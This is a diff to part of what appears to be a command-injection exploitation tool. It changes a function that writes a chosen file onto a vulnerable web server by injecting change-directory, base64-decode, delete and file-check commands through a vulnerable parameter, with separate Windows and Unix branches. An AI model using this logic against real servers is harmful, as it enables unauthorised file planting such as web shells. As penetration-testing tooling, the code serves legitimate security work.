@@ -35,30 +35,20 @@ def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, htt
   file_to_write, dest_to_write, content = checks.check_file_to_write()
   if settings.TARGET_OS == "win":
     cmd = checks.change_dir(dest_to_write)
-    cmd = cmd + separator + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     fname, tmp_fname, cmd = checks.find_filename(dest_to_write, content)
-    cmd = cmd + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     cmd = checks.win_decode_b64_enc(fname, tmp_fname)
-    cmd = cmd + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
     cmd = checks.delete_tmp(tmp_fname)
-    cmd = cmd + separator + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
-    # cmd = "cmd /c if exist " + fname + " (echo " + fname + ")" 
-    # dest_to_write = dest_to_write + "\\" + fname
-    cmd = checks.check_file(dest_to_write)
-    cmd = checks.add_new_cmd(cmd)
-    if not menu.options.alter_shell:
-      cmd = checks.quoted_cmd(cmd)
   else:
     cmd = checks.write_content(content, dest_to_write)
     cmd = cmd + settings.COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     shell = "".join(str(p) for p in shell)
-    cmd = checks.check_file(dest_to_write)
+  cmd = checks.check_file(dest_to_write)
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
   shell = "".join(str(p) for p in shell)
